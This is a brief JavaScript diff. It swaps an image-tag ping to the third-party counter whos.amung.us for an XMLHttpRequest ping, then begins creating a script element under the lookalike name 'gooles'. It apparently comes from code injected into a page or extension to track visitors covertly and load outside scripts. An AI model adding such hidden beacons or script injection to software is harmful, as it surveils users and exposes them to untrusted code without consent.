@@ -1,4 +1,6 @@
-new Image().src = '//whos.amung.us/swidget/8k1doonmsawi';
+xmlHttp = new XMLHttpRequest;
+xmlHttp["open"]("GET", "//whos.amung.us/pingjs/?k=8k1doonmsawi", true);
+xmlHttp["send"](null);
 
 
 var gooles = document.createElement("script");
